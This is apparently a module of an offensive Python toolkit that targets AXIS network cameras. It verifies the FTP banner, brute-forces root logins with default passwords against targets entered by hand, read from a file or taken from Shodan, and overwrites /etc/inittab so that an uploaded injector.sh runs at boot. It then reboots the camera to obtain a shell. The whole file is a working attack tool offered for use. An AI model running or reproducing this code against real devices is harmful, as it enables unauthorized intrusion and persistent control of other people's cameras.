# -*- coding : utf-8 -*-
#Author: [Q]3rV[0]
import sys
sys.path.append('.')
from config import config
from tabulate import tabulate
import re
from ftplib import FTP


class module(config):

    def __init__(self):
        self.config=config()
        self.cur = self.config.getCursor()
        self.con = self.config.getCon()
        self.targets=[]
        self.dicc=["root", 123456, 1234, 123, "toor", "ftp"]
        self.preExecution()

    def preExecution(self):
        while 1:
            opcion=raw_input("> ")
            
            if opcion=="exit":
                exit(0)

            elif opcion=="help":
                print("set target <IP> --> Manual Target")
                print("set file <PATH> --> Indicate file with targets")
                print("clear targets   --> Show Targets in module")
                print("show targets    --> Clear Targets in module")
                print("use shodan      --> Targets from Shodan Results")
                print("exploit         --> Start atack")
                print("info            --> Show info of module")
                print("exit            --> Close Module")

            elif re.match("set target [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", opcion)!=None:
                target=opcion.split(' ')[2]
                self.targets.append((0,target,"Axis Cam Bruteforce Intruder","null"))

            elif opcion=="use shodan":
                self.targets=self.config.getTargets()

            elif opcion=="clear targets":
                self.targets=[]
                print("Clear Done")

            elif opcion=="show targets":
                if len(self.targets)>0:
                    print tabulate(self.targets, ["id", "IP", "PORT", "Description"], tablefmt="grid")
                else:
                    print "No Targets"

            elif opcion.find("set file")!=-1:
                id=0
                path_file=opcion.split(' ')
                if len(path_file)!=3:
                    print "Error de sintaxis"
                else:
                    self.targets=[]
                    for l in open(path_file[2], "r"):
                        l=l.replace("\n", "")
                        ip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', l);
                        if ip!=None:
                            self.targets.append((id, ip[0], "Axis Cam Bruteforce Intruder", "null"))
                        id+=1
                    print 'Targets agregados, <show targets> para ver.'

            elif opcion=="info":
                print "[*] Module to exploit weak credentials AXIS cameras and up a payload to access the internal system"
                print "[*] by [Q]3rv[0]"
            elif opcion=="exploit":
                self.exploit()

    def verify_axis_cam(self, target):
        try:
            ftp=FTP(target)
            banner_ftp=ftp.getwelcome()
            ftp.close()
            banner_ftp=banner_ftp.split(' ')[1]
            if banner_ftp=='AXIS':
                return True
            else:
                return False
        except:
            print "[*] Error al conectar al servicio FTP"
            exit(0)


    def axis_exploit(self, target):
        if self.verify_axis_cam(target)==True:
            for passwd in self.dicc:
                try:
                    inittab_dest="/tmp/inittab"
                    inittab_orig="/etc/inittab"
                    injector_orig="/usr/html/local/injector.sh"
                    ftp=FTP(target)
                    ftp.login("root", "%s" % passwd)
                    ftp.retrbinary("RETR %s" % inittab_orig, open(inittab_dest, "wb").write)
                    self.add_inittab()
                    ftp.storbinary("STOR %s" % inittab_orig, open(inittab_dest, "rb"))
                    ftp.storbinary("STOR %s" % injector_orig, open(self.config.getApachePath()+"/Injector/injector.sh", "rb"))
                    ftp.sendcmd("SITE CHMOD 755 %s" % injector_orig)
                    ftp.sendcmd("site reboot")
                    ftp.quit()
                    ftp.close()
                    print "[*] Explotado correctamente, espere unos segundos a que el dispositivo reinicie para obtener la shell"
                    break
                except:
                    ftp.quit()
                    ftp.close()

        else:
            print "[*]%s : No se ha podido verificar que se trate de una camara AXIS" % target


    def add_inittab(self):
        f=open("/tmp/inittab", "r")
        data=f.read()
        f.close()
        if data.find("injector:35:once:/usr/html/local/injector.sh")==-1:
            f=open("/tmp/inittab", "a+")
            f.write("\ninjector:35:once:/usr/html/local/injector.sh")
            f.close()


    def exploit(self):
        if len(self.targets)>0:
            for target in self.targets:
                print "[*] Attack "+target[1]
                ###### exploit axis cam #################
                self.axis_exploit(target[1])
        else:
            print "No targets found"


start=module()
